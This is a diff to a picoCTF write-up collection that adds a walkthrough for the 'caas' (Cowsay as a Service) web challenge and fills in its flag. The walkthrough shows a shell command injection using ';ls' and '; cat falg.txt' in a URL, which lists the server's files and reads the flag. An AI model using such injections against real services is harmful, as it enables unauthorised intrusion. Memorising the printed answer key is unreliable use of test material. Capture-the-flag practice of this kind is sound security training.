@@ -35,7 +35,7 @@ Web Exploitation entails the manipulation of websites and web hosted services us
 - [Web Gauntlet 3 (2021)](#web-gauntlet-3) ✓
 - [Bithug (2021)](#bithug)
 - [login (2021)](#login) ✓
-- [caas (2021)](#caas)
+- [caas (2021)](#caas) ✓
 - [notepad (2021)](#notepad)
 
 
@@ -4983,6 +4983,8 @@ None
 
 ### Attachments
 
+1. [index.js](https://artifacts.picoctf.net/picoMini+by+redpwn/Web+Exploitation/caas/index.js)
+	
 <details>
 
 <summary markdown="span">index.js</summary>
@@ -5014,6 +5016,81 @@ app.listen(3000, () => {
 
 <summary markdown="span">Solution 1</summary>
 
+Visiting the [caas webpage](https://caas.mars.picoctf.net/) we get the message:
+
+~~~
+Cowsay as a Service
+Make a request to the following URL to cowsay your message:
+https://caas.mars.picoctf.net/cowsay/{message}
+~~~
+
+Inspecting the source, we can see index.js is imported.
+
+~~~html
+<!doctype html>
+<html>
+    <head>
+        <link rel="stylesheet" href="styles.css"/>
+        <script src="index.js"></script>
+        <title>CaaS</title>
+    </head>
+    <body>
+        <h1>Cowsay as a Service</h1>
+        <strong>Make a request to the following URL to cowsay your message:</strong>
+        <br>
+        <code></code>
+    </body>
+</html>
+~~~
+
+The website provides a text output based on the URL. For example, view-source:https://caas.mars.picoctf.net/cowsay/moo:
+
+~~~
+ _____
+< moo >
+ -----
+        \   ^__^
+         \  (oo)\_______
+            (__)\       )\/\
+                ||----w |
+                ||     ||
+
+~~~
+
+If we use the delimiter character ; we can inject commands https://caas.mars.picoctf.net/cowsay/moo;ls
+
+~~~
+ _____
+< moo >
+ -----
+        \   ^__^
+         \  (oo)\_______
+            (__)\       )\/\
+                ||----w |
+                ||     ||
+Dockerfile
+falg.txt
+index.js
+node_modules
+package.json
+public
+yarn.lock
+~~~
+
+We can see the flag is probably in falg.txt, we can use cat to open the flag file: https://caas.mars.picoctf.net/cowsay/moo;%20cat%20falg.txt
+
+~~~
+ _____
+< moo >
+ -----
+        \   ^__^
+         \  (oo)\_______
+            (__)\       )\/\
+                ||----w |
+                ||     ||
+picoCTF{moooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0o}
+~~~
+
 </details>
 
 ### Answer
@@ -5023,7 +5100,7 @@ app.listen(3000, () => {
 <summary markdown="span">Flag</summary>
 
 ~~~
-picoCTF{}
+picoCTF{moooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0o}
 ~~~
 
 </details>
